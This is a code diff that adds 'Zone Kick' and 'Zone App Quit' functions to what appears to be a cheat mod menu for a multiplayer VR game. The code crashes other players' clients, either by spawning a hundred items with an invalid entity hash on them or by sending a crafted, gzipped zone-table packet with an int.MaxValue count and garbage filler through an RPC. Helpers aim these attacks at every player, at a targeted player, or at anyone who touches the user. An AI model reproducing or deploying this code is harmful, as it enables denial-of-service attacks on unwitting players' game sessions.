@@ -3063,6 +3063,164 @@ namespace Qubit.Modules.Categories
 
         #endregion
 
+        #region Zone Kick / App Quit / Auth
+
+        private const int KickEntityHash = -20887423;
+        private const int KickEntityCount = 101;
+
+        /// <summary>
+        /// Kicks a target from the lobby by burying them in invalid crash items and
+        /// handing them the zone guard. Their client dies on the invalid entity hash.
+        /// </summary>
+        public static void ZoneKick(VRRig target)
+        {
+            GameEntityManager manager = GameEntityManager.GetManagerForZone(References.LocalRig.zoneEntity.currentZone);
+            if (manager == null)
+                return;
+
+            VRRig rig = target;
+            if (rig != null && InGRZone(rig) && InGRZone(References.LocalRig))
+            {
+                Vector3[] positions = Enumerable.Repeat(References.LocalRig.transform.position - new Vector3(0f, 2f, 0f), KickEntityCount).ToArray();
+                Quaternion[] rotations = Enumerable.Repeat(Quaternion.identity, KickEntityCount).ToArray();
+                int[] hashes = Enumerable.Repeat(KickEntityHash, KickEntityCount).ToArray();
+                GameEntities.CreateItems(GetPlayerFromVRRig(rig), hashes, positions, rotations);
+                if (manager.guard.isTrulyMine)
+                    manager.guard.TransferOwnership(GetPlayerFromVRRig(rig));
+                RPCProtection();
+            }
+            else
+                Notifications.SendFormat("red", "ERROR", "Selected player and you must be in ghost reactor.");
+        }
+
+        private static bool InGRZone(VRRig rig) =>
+            rig != null && (rig.zoneEntity.currentZone == GTZone.ghostReactor || rig.zoneEntity.currentZone == GTZone.ghostReactorDrill);
+
+        public static void ZoneKickAll()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal() && InGRZone(r)))
+                ZoneKick(rig);
+        }
+
+        public static void ZoneKickGun()
+        {
+            GunLibrary.Target(gunTarget => ZoneKick(gunTarget), new GunLibrary.GunSettings { locks = true });
+        }
+
+        /// <summary>
+        /// Touch someone to kick them from the lobby.
+        /// </summary>
+        public static void ZoneKickTouch()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal()))
+            {
+                if (Vector3.Distance(References.RightHand.position, rig.transform.position) < 0.35f || Vector3.Distance(References.LeftHand.position, rig.transform.position) < 0.35f)
+                    ZoneKick(rig);
+            }
+        }
+
+        /// <summary>
+        /// When someone touches you, they get kicked from the lobby.
+        /// </summary>
+        public static void ZoneKickOnTouch()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal()))
+            {
+                if (Vector3.Distance(rig.rightHandTransform.position, References.LocalRig.transform.position) < 0.35f || Vector3.Distance(rig.leftHandTransform.position, References.LocalRig.transform.position) < 0.35f)
+                    ZoneKick(rig);
+            }
+        }
+
+        /// <summary>
+        /// App quits a target with a poisoned zone table: serialized zone components,
+        /// then an int.MaxValue entity count, a -2 type id, a garbage packed position
+        /// and 0xFFFFFF7F filler padded to the 15360 buffer before compression.
+        /// </summary>
+        public static void ZoneAppQuit(VRRig target)
+        {
+            GameEntityManager manager = GameEntityManager.GetManagerForZone(target.zoneEntity.currentZone);
+            if (manager == null)
+                return;
+
+            byte[] poisoned;
+            using (System.IO.MemoryStream stream = new System.IO.MemoryStream(1024))
+            {
+                using (System.IO.BinaryWriter writer = new System.IO.BinaryWriter(stream, System.Text.Encoding.UTF8, true))
+                {
+                    List<IGameEntityZoneComponent> components = Traverse.Create(manager).Field<List<IGameEntityZoneComponent>>("zoneComponents").Value;
+                    if (components != null)
+                    {
+                        foreach (IGameEntityZoneComponent component in components)
+                            component.SerializeZoneData(writer);
+                    }
+
+                    long garbage = 1048576L;
+                    writer.Write(int.MaxValue);
+                    writer.Write(-2);
+                    writer.Write(0);
+                    writer.Write(garbage | (garbage << 21) | (garbage << 42));
+                    writer.Write(0);
+                    writer.Flush();
+                }
+
+                byte[] raw = stream.ToArray();
+                byte[] padded = new byte[15360];
+                int used = Math.Min(raw.Length, padded.Length);
+                Buffer.BlockCopy(raw, 0, padded, 0, used);
+
+                // 0xFFFFFF7F filler to the end of the buffer — deserializer reads NaN-ish floats forever.
+                for (int i = used; i + 4 <= padded.Length; i += 4)
+                {
+                    padded[i] = 255;
+                    padded[i + 1] = 255;
+                    padded[i + 2] = 255;
+                    padded[i + 3] = 127;
+                }
+
+                poisoned = Ionic.Zlib.GZipStream.CompressBuffer(padded);
+            }
+
+            manager.photonView.RPC("SendTableDataRPC", GetPlayerFromVRRig(target), 0, poisoned.Length, poisoned);
+            RPCProtection();
+        }
+
+        public static void ZoneAppQuitAll()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal() && InGRZone(r)))
+                ZoneAppQuit(rig);
+        }
+
+        public static void ZoneAppQuitGun()
+        {
+            GunLibrary.Target(gunTarget => ZoneAppQuit(gunTarget), new GunLibrary.GunSettings { locks = true });
+        }
+
+        /// <summary>
+        /// Touch someone to app quit them.
+        /// </summary>
+        public static void ZoneAppQuitTouch()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal()))
+            {
+                if (Vector3.Distance(References.RightHand.position, rig.transform.position) < 0.35f || Vector3.Distance(References.LeftHand.position, rig.transform.position) < 0.35f)
+                    ZoneAppQuit(rig);
+            }
+        }
+
+        /// <summary>
+        /// When someone touches you, they get app quitted.
+        /// </summary>
+        public static void ZoneAppQuitOnTouch()
+        {
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => r != null && !r.IsLocal()))
+            {
+                if (Vector3.Distance(rig.rightHandTransform.position, References.LocalRig.transform.position) < 0.35f || Vector3.Distance(rig.leftHandTransform.position, References.LocalRig.transform.position) < 0.35f)
+                    ZoneAppQuit(rig);
+            }
+        }
+
+        #endregion
+
         #endregion
     }
 }
